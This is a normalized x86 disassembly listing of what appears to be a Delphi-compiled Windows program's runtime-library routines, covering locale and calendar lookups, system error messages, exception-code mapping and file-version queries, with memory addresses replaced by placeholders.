mov ecx r-xdata
mov eax ebp
call sub_40a790
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xc ]
mov edx esi
mov eax ebp
call sub_40a6fc
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
ja r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a790
test al al
jne r-xdata
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40a81c
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
jne r-xdata
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a790
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xe ]
mov edx esi
mov eax ebp
call sub_40a6fc
test al al
je r-xdata
add [ esp + 0x4 ] di
mov [ esp + 0x4 ] 0x0
sub_40aed0
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
mov ecx esi
mov edx esp
mov eax ebx
call sub_40a998
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_4042f8
cmp eax [ esp ]
jl r-xdata
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_40af04
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
mov ecx esi
mov edx esp
mov eax ebx
call sub_40acdc
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_4042f8
cmp eax [ esp ]
jl r-xdata
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_40af38
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov esi eax
mov bl 0x1
mov [ esp ] 0x1
xor eax eax
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax esi
call sub_40a998
test al al
je r-xdata
mov edx edi
mov eax esi
call sub_40af04
mov ebx eax
jmp r-xdata
mov eax esi
call sub_4042f8
cmp eax [ esp ]
jl r-xdata
mov eax ebx
add esp 0x18
pop edi
pop esi
pop ebx
retn
fld [ esp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jb r-xdata
lea ecx [ esp + 0x10 ]
mov edx esp
mov eax esi
call sub_40acdc
test al al
jne r-xdata
fld [ esp + 0x8 ]
fsub [ esp + 0x10 ]
fstp [ edi ]
fwait
fld [ esp + 0x8 ]
fadd [ esp + 0x10 ]
fstp [ edi ]
fwait
jmp r-xdata
sub_40afc4
push ebx
add esp 0xffffff00
mov ebx edx
push 0x0
push 0x100
lea edx [ esp + 0x8 ]
push edx
push 0x0
push eax
push 0x0
push 0x3200
call FormatMessageA
jmp r-xdata
test eax eax
jle r-xdata
mov edx esp
mov ecx ebx
xchg ecx eax
call sub_404128
add esp 0x100
pop ebx
retn
mov dl [ esp + eax - 0x1 ]
sub dl 0x21
jb r-xdata
dec eax
sub dl 0xd
je r-xdata
sub_40b010
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov esi ecx
mov ebx [ ebp + 0x8 ]
push 0x100
lea ecx [ ebp - 0x100 ]
push ecx
push edx
push eax
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov edx esi
call sub_40408c
mov ecx eax
dec ecx
lea edx [ ebp - 0x100 ]
mov eax ebx
call sub_404128
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_40b05c
push ebx
push esi
push edi
push ecx
mov ebx ecx
mov esi edx
mov edi eax
push 0x2
lea eax [ esp + 0x4 ]
push eax
push esi
push edi
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov al [ esp ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_40b084
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push ebx
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x4 ]
xor ecx ecx
mov edx esi
call sub_40b010
cmp [ ebx ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx ebx
call sub_405dec
sub_40b0c0
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_40b1d3
push [ fs : eax ]
mov [ fs : eax ] esp
call GetThreadLocale
mov [ ebp - 0x4 ] eax
mov ebx 0x1
mov esi rw-data
mov edi rw-data
push ebp
push 0xb
lea eax [ ebp - 0xc ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x44 ]
dec eax
call sub_40b084
pop ecx
mov edx [ ebp - 0xc ]
mov eax esi
call sub_40408c
push ebp
push 0xb
lea eax [ ebp - 0x10 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x38 ]
dec eax
call sub_40b084
pop ecx
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_40408c
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0xd
jne r-xdata
mov ebx 0x1
mov esi rw-data
mov edi rw-data
lea eax [ ebx + 0x5 ]
mov ecx 0x7
cdq
idiv ecx
mov [ ebp - 0x8 ] edx
push ebp
push 0x6
lea eax [ ebp - 0x14 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x31
call sub_40b084
pop ecx
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_40408c
push ebp
push 0x6
lea eax [ ebp - 0x18 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x2a
call sub_40b084
pop ecx
mov edx [ ebp - 0x18 ]
mov eax edi
call sub_40408c
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0x8
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b1da
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_40405c
retn
sub_40b1e4
push ebp
mov ebp esp
push ebx
push esi
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0x0
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebx * 4 + rw-data ]
mov edx [ ebp + 0x8 ]
call sub_404230
mov esi 0x1
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
inc ebx
sub_40b220
push ebp
mov ebp esp
push 0x0
push ebx
push esi
xor eax eax
push ebp
push sub_40b285
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0xffffffff
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404230
mov eax [ ebp - 0x4 ]
xor edx edx
call sub_40834c
mov [ ebx * 4 + rw-data ] eax
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b28c
lea eax [ ebp - 0x4 ]
call sub_404038
retn
inc ebx
sub_40b298
push ebp
mov ebp esp
push 0x0
push esi
xor eax eax
push ebp
push sub_40b32f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x100b
call sub_40b010
mov eax [ ebp - 0x4 ]
mov edx 0x1
call sub_40834c
mov esi eax
mov eax esi
add eax 0xfffffffd
sub eax 0x3
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b336
lea eax [ ebp - 0x4 ]
call sub_404038
retn
push 0x4
push esi
call GetThreadLocale
push eax
push sub_40b1e4
call EnumCalendarInfoA
mov edx 0x7
mov eax rw-data
mov [ eax ] 0xffffffff
add eax 0x4
dec edx
jne r-xdata
push 0x3
push esi
call GetThreadLocale
push eax
push sub_40b220
call EnumCalendarInfoA
sub_40b348
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_40b512
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx 0x1
mov eax edi
call sub_404038
lea eax [ ebp - 0x8 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x1009
call sub_40b010
mov eax [ ebp - 0x8 ]
mov edx 0x1
call sub_40834c
add eax 0xfffffffd
sub eax 0x3
jb r-xdata
mov eax esi
call sub_4042f8
cmp ebx eax
jle r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
mov al [ esi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b519
lea eax [ ebp - 0x14 ]
mov edx 0x4
call sub_40405c
retn
mov al 0x1
add eax 0xfffffff3
sub eax 0x2
jb r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_408990
test eax eax
jne r-xdata
mov edx ebx
mov eax esi
call sub_40c40c
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax esi
call sub_404558
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_404300
add ebx [ ebp - 0x4 ]
jmp r-xdata
mov eax edi
mov edx esi
call sub_40408c
jmp r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x4
call sub_408990
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_404300
inc ebx
jmp r-xdata
mov eax esi
call sub_4042f8
cmp ebx eax
jle r-xdata
test al al
je r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_408990
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_404300
add ebx 0x3
jmp r-xdata
inc ebx
mov al [ esi + ebx - 0x1 ]
sub al 0x47
je r-xdata
jmp r-xdata
mov al [ esi + ebx - 0x1 ]
sub al 0x59
je r-xdata
mov eax edi
mov edx r-xdata
call sub_404300
inc ebx
jmp r-xdata
inc ebx
sub al 0x20
je r-xdata
mov eax edi
mov edx r-xdata
call sub_404300
jmp r-xdata
sub al 0x20
jne r-xdata
lea eax [ ebp - 0xc ]
mov dl [ esi + ebx - 0x1 ]
call sub_404220
mov edx [ ebp - 0xc ]
mov eax edi
call sub_404300
lea eax [ ebp - 0x14 ]
mov dl [ esi + ebx - 0x1 ]
call sub_404220
mov edx [ ebp - 0x14 ]
mov eax edi
call sub_404300
sub_40b57c
push ebp
mov ebp esp
add esp 0xfffffba8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
push 0x1c
lea eax [ ebp - 0x330 ]
push eax
push ebx
call VirtualQuery
cmp [ ebp - 0x320 ] 0x1000
jne r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ rw-data ]
push eax
call GetModuleFileNameA
mov eax ebx
call sub_40b570
mov [ ebp - 0x8 ] eax
jmp r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ ebp - 0x32c ]
push eax
call GetModuleFileNameA
test eax eax
jne r-xdata
lea eax [ ebp - 0x212 ]
mov dl 0x5c
call sub_40c5e8
mov edx eax
inc edx
lea eax [ ebp - 0x10d ]
mov ecx 0x104
call sub_4088b4
mov ebx r-xdata
mov edi r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
sub ebx [ ebp - 0x32c ]
mov [ ebp - 0x8 ] ebx
push 0x100
lea eax [ ebp - 0x312 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_405358
push eax
call LoadStringA
lea edx [ ebp - 0x458 ]
mov eax [ esi ]
call sub_403238
lea eax [ ebp - 0x458 ]
mov [ ebp - 0x358 ] eax
mov [ ebp - 0x354 ] 0x4
lea eax [ ebp - 0x10d ]
mov [ ebp - 0x350 ] eax
mov [ ebp - 0x34c ] 0x6
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x348 ] eax
mov [ ebp - 0x344 ] 0x5
mov [ ebp - 0x340 ] ebx
mov [ ebp - 0x33c ] 0x6
mov [ ebp - 0x338 ] edi
mov [ ebp - 0x334 ] 0x6
lea eax [ ebp - 0x358 ]
push eax
push 0x4
lea ecx [ ebp - 0x312 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_408ed8
mov eax [ ebp - 0x4 ]
call sub_408824
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0x4 ]
call sub_4044f8
mov ebx eax
mov eax ebx
call sub_408824
test eax eax
je r-xdata
cmp [ ebx + eax - 0x1 ] 0x2e
je r-xdata
mov edi r-xdata
sub_40b704
add esp 0xfffffbbc
push 0x400
lea ecx [ esp + 0x48 ]
call sub_40b57c
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x40
lea eax [ esp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_405358
push eax
call LoadStringA
push 0x2010
lea eax [ esp + 0x8 ]
push eax
lea eax [ esp + 0x4c ]
push eax
push 0x0
call MessageBoxA
mov eax [ rw-data ]
call sub_402b88
call sub_4028d4
lea eax [ esp + 0x44 ]
push eax
lea eax [ esp + 0x48 ]
push eax
call CharToOemA
push 0x0
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4c ]
call sub_408824
push eax
lea eax [ esp + 0x50 ]
push eax
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
jmp r-xdata
add esp 0x444
retn
sub_40b7d8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_40408c
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_40b814
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40b86e
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_408f18
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_40408c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b875
lea eax [ ebp - 0x4 ]
call sub_404038
retn
add esp 0xfffffff0
call sub_40360c
sub_40b875
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_40b894
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea edx [ edi + 0x4 ]
mov eax esi
call sub_405dec
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_40b8d0
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40b93c
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_405dec
mov eax [ ebp - 0x8 ]
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
call sub_408f18
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_40408c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b943
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40405c
retn
add esp 0xfffffff0
call sub_40360c
sub_40b943
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_40b964
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_40408c
mov eax [ ebp + 0x8 ]
mov [ edi + 0x8 ] eax
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_40b9d8
push ebx
push esi
add esp 0xfffffff8
xor ebx ebx
call sub_402948
mov esi eax
jmp r-xdata
cmp ebx 0x6
jg r-xdata
cmp ebx 0x6
jg r-xdata
cmp esi [ ebx * 8 + rw-data ]
jne r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8d0
mov ecx [ ebx * 8 + rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7d8
jmp r-xdata
inc ebx
mov [ eax + 0xc ] esi
pop ecx
pop edx
pop esi
pop ebx
retn
sub_40ba38
cmp al 0xba
inc eax
add [ esi ] cl
or dl [ ebp + eax * 2 + 0x78 ]
arpl [ ebp + 0x70 ] sp
je r-xdata
pop es
arpl [ gs : eax ] cx
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah ah
adc [ eax ] al
add al 0x0
add [ eax ] al
push ebx
mov ebx edx
mov edx eax
dec dl
je r-xdata
mov edx [ rw-data ]
jmp r-xdata
dec dl
je r-xdata
push ebx
mov eax edx
jmp sub_403a74
mov edx [ rw-data ]
jmp r-xdata
dec edx
sub dl 0x16
jb r-xdata
and eax 0xff
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40b7d8
mov edx eax
jmp r-xdata
jmp r-xdata
call sub_40b9d8
mov edx eax
sub_40baac
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x4 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40bb48
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405dec
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_4040d0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0xb
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0xb
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x1c ]
push eax
push 0x2
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405dec
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b814
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bb4f
lea eax [ ebp - 0x20 ]
call sub_404038
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_40bb9c
mov eax [ eax ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0x6
retn
cmp eax 0xc000008e
jg r-xdata
mov al 0xe
retn
sub eax 0x3d
je r-xdata
mov al 0xc
retn
sub eax 0xc0000093
je r-xdata
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd
retn
jmp r-xdata
mov al 0x9
retn
dec eax
je r-xdata
je r-xdata
mov al 0x7
retn
sub eax 0xc0000005
je r-xdata
mov al 0x16
retn
mov al 0x3
retn
dec eax
je r-xdata
mov al 0x8
retn
jmp r-xdata
mov al 0xb
retn
sub eax 0x87
je r-xdata
mov al 0x5
retn
jmp r-xdata
mov al 0x4
retn
dec eax
je r-xdata
jmp r-xdata
sub_40bc34
push ebp
mov ebp esp
add esp 0xfffffe90
push ebx
push esi
xor eax eax
mov [ ebp - 0x170 ] eax
mov [ ebp - 0x14c ] eax
mov [ ebp - 0x154 ] eax
mov [ ebp - 0x150 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40bdef
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x4 ]
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405dec
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405dec
jmp r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x16c ] eax
mov [ ebp - 0x168 ] 0x5
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x164 ] eax
mov [ ebp - 0x160 ] 0xb
mov [ ebp - 0x15c ] esi
mov [ ebp - 0x158 ] 0x5
lea eax [ ebp - 0x16c ]
push eax
push 0x2
lea edx [ ebp - 0x170 ]
mov eax [ rw-data ]
call sub_405dec
mov ecx [ ebp - 0x170 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b814
mov ebx eax
push 0x105
lea eax [ ebp - 0x125 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetModuleFileNameA
test eax eax
je r-xdata
mov esi [ ebx + 0x18 ]
push 0x1c
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebx + 0xc ]
push eax
call VirtualQuery
cmp [ ebp - 0x10 ] 0x1000
jne r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x148 ] eax
mov [ ebp - 0x144 ] 0x5
lea eax [ ebp - 0x150 ]
lea edx [ ebp - 0x125 ]
mov ecx 0x105
call sub_4042a8
mov eax [ ebp - 0x150 ]
lea edx [ ebp - 0x14c ]
call sub_4086f4
mov eax [ ebp - 0x14c ]
mov [ ebp - 0x140 ] eax
mov [ ebp - 0x13c ] 0xb
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x138 ] eax
mov [ ebp - 0x134 ] 0xb
mov [ ebp - 0x130 ] esi
mov [ ebp - 0x12c ] 0x5
lea eax [ ebp - 0x148 ]
push eax
push 0x3
lea edx [ ebp - 0x154 ]
mov eax [ rw-data ]
call sub_405dec
mov ecx [ ebp - 0x154 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b814
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bdf6
lea eax [ ebp - 0x170 ]
call sub_404038
lea eax [ ebp - 0x154 ]
mov edx 0x3
call sub_40405c
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_40be00
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40bebb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40bb9c
and eax 0xff
mov edx eax
add edx 0xfffffffd
sub edx 0x8
jb r-xdata
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40b7d8
mov ebx eax
jmp r-xdata
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
push ebp
call sub_40bc34
pop ecx
mov ebx eax
jmp r-xdata
dec edx
sub edx 0xa
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bec2
lea eax [ ebp - 0x10 ]
call sub_404038
retn
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405dec
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b814
mov ebx eax
sub_40bedc
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b894
mov [ rw-data ] eax
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b894
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] r-xdata
mov eax [ rw-data ]
mov [ eax ] sub_40becc
mov eax [ rw-data ]
mov edx [ r-xdata ]
mov [ eax ] edx
mov eax [ rw-data ]
mov [ eax ] sub_40bc1c
mov eax [ rw-data ]
mov [ eax ] sub_40be00
mov eax sub_40bb68
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40bb84
mov edx [ rw-data ]
mov [ edx ] eax
retn
sub_40bf60
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx - 0x8 ]
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
retn
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
call sub_4032e8
xor eax eax
mov [ rw-data ] eax
sub_40bfe0
add esp 0xffffff6c
mov [ esp ] 0x94
push esp
call GetVersionExA
test eax eax
je r-xdata
add esp 0x94
retn
mov eax [ esp + 0x10 ]
mov [ rw-data ] eax
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
mov eax [ esp + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ esp + 0xc ]
mov [ rw-data ] eax
mov eax [ esp + 0xc ]
and eax 0xffff
mov [ rw-data ] eax
jmp r-xdata
mov eax rw-data
lea edx [ esp + 0x14 ]
mov ecx 0x80
call sub_4042a8
sub_40c070
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_40c146
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_4040d0
lea eax [ ebp - 0x8 ]
call j_sub_404504#2
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
call sub_4044f8
push eax
call GetFileVersionInfoSizeA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c14d
lea eax [ ebp - 0x8 ]
call sub_404038
retn
mov eax ebx
call sub_40276c
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_40c129
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
push ebx
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
call sub_4044f8
push eax
call GetFileVersionInfoA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_40278c
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
call VerQueryValueA
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
sub_40c15c
push esi
push edi
mov edi edx
xor edx edx
test eax eax
je r-xdata
mov eax edx
pop edi
pop esi
retn
cmp [ eax + edi ] 0x0
je r-xdata
test edi edi
jne r-xdata
mov esi edi
dec esi
jmp r-xdata
mov al [ eax ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
test esi esi
jl r-xdata
mov dl 0x1
jmp r-xdata
mov ecx edi
sub ecx esi
and ecx 0x80000001
jns r-xdata
mov cl [ eax + esi ]
and ecx 0xff
bt [ rw-data ] ecx
jb r-xdata
test ecx ecx
jne r-xdata
dec ecx
or ecx 0xfffffffe
inc ecx
dec esi
mov al [ eax + edi ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov dl 0x2
jmp r-xdata
mov dl 0x1
sub_40c1d4
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_4044f8
mov edx esi
dec edx
call sub_40c15c
sub_40c210
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4042f8
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_40c238
pop esi
pop ebx
retn
mov eax ebx
call sub_4042f8
mov esi eax
sub_40c238
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor edi edi
